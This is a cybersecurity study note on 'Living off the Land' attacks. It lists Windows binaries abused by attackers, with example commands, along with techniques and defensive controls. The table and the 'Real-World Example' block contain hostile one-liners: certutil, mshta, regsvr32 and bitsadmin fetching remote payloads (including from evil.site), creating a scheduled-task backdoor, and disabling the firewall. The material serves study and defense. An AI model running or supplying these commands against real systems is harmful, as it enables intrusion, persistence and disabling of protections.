**Living off the Land (LotL)** refers to the use of legitimate system tools and native binaries to carry out malicious activity, avoiding detection by blending into normal operations.

---

## 🎯 Purpose of LotL Techniques

- Evade security tools (AV/EDR)
- Avoid dropping custom malware
- Use trusted, signed tools already present on the system
- Maintain stealth and persistence

---

## 🧰 Common LOLBins (Living Off the Land Binaries)

| Binary/Tool         | Purpose Used By Attackers                      | Example Command                                         |
|---------------------|------------------------------------------------|--------------------------------------------------------|
| `PowerShell`        | Execute payloads, download scripts             | `powershell -enc <Base64Payload>`                      |
| `WMIC`              | Run commands remotely                          | `wmic process call create "calc.exe"`                  |
| `Certutil`          | Download or encode/decode files                | `certutil -urlcache -split -f http://... malware.exe`  |
| `Mshta.exe`         | Execute malicious HTA (HTML apps)              | `mshta http://malicious.hta`                           |
| `Rundll32.exe`      | Execute DLLs with exported functions           | `rundll32.exe mymalware.dll,EntryPoint`                |
| `Regsvr32.exe`      | Register or execute COM objects                | `regsvr32 /s /n /u /i:http://malicious.sct scrobj.dll` |
| `Bitsadmin`         | Download/upload files in the background        | `bitsadmin /transfer job http://...`                   |
| `Task Scheduler`    | Establish persistence                          | `schtasks /create /tn backdoor /tr malware.exe ...`    |
| `Explorer.exe`      | Inject into trusted process                    | Used in process hollowing                              |
| `Netsh`             | Alter firewall settings                        | `netsh advfirewall set allprofiles state off`          |

---

## 🛠 Techniques Used

| Technique               | Description                                                            |
|-------------------------|------------------------------------------------------------------------|
| **Dual-use Tools**      | Using legitimate admin tools like `PsExec`, `Sysinternals`, or `NirCmd`|
| **Fileless Malware**    | Memory-resident code leveraging system tools without writing to disk   |
| **Script-based Execution** | Running `.bat`, `.vbs`, `.js` scripts natively using built-in interpreters|
| **Macro-enabled Docs**  | Using Office macros and trusted binaries like `MSBuild` for execution   |
| **Environment Abuse**   | Hiding payloads in registry, WMI, or Scheduled Tasks                    |

---

## 🧱 Defense Strategies

| Control Type     | Defense Technique                                           |
|------------------|-------------------------------------------------------------|
| **Preventive**   | App whitelisting (e.g., AppLocker, WDAC), disable unused tools |
| **Detective**    | Log analysis with Sysmon, Event Viewer, SIEM correlation    |
| **Corrective**   | Remove persistence artifacts, rotate credentials            |
| **Technical**    | EDR platforms with behavior analytics, command-line logging |
| **Operational**  | Admin account auditing, reduce privilege creep              |
| **Managerial**   | Enforce policy restricting script/tool usage                |

---

## ⚔️ Red Team vs Blue Team

- **Red Team**: Uses LOLBins to bypass AV, e.g. `Invoke-Obfuscation`, `Empire`, Cobalt Strike.
- **Blue Team**: Detects anomalous use of built-in binaries, e.g. `rundll32` spawning `cmd.exe`.

---

## 🔬 Real-World Example

```powershell
# Using certutil to download and execute a payload
certutil.exe -urlcache -split -f http://evil.site/payload.exe payload.exe
start payload.exe
```

- Completely fileless variant may execute payload directly in memory using PowerShell.

---

## 🗂 Related Topics

- [[Defense Evasion Techniques]]
- [[PowerShell Attacks]]
- [[EDR & Threat Detection]]
- [[Process Injection]]
- [[Malware Persistence]]
- [[Windows Event IDs]]

---

## 🏷 Tags

#living_off_the_land #lotl #lolbins #malware #redteam #blueteam #powershell #defense_evasion #edr #fileless_malware